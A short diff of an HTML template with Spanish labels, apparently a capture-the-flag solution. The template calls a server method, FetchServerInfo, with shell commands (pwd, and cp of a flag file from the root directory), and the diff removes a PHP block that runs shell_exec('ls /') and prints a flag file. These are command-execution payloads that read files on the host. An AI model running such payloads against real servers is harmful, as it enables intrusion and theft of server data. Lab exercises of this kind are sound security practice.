@@ -40,25 +40,11 @@
     <li>Flag: {{.FetchServerInfo "pwd"}}</li>
     </ul>
 
-<h6>Contenido de archivo txt</h6>
+<h5>Contenido de archivo txt</h5>
     <ul>
-    <li>Contenido del archivo:</li>
-    <?php
-$files = explode("\n", shell_exec("ls /")); // Obtén la lista de archivos
-$targetFile = "flagc367189f45.txt"; // Nombre del archivo que deseas mostrar
-if (in_array($targetFile, $files)) {
-    echo "<h2>Contenido de $targetFile</h2>"; // Muestra el nombre del archivo como encabezado
-    echo "<pre>";
-    echo file_get_contents("/$targetFile"); // Muestra el contenido del archivo
-    echo "</pre>";
-} else {
-    echo "El archivo no se encuentra en el directorio especificado.";
-}
-?>
-
-</ul>
-
-
+    <li>Flag: {{.FetchServerInfo "cp /flagc367189f45.txt app/flagc367189f45.txt"}}</li>
+    </ul>
+   
     
 </body>
 </html>
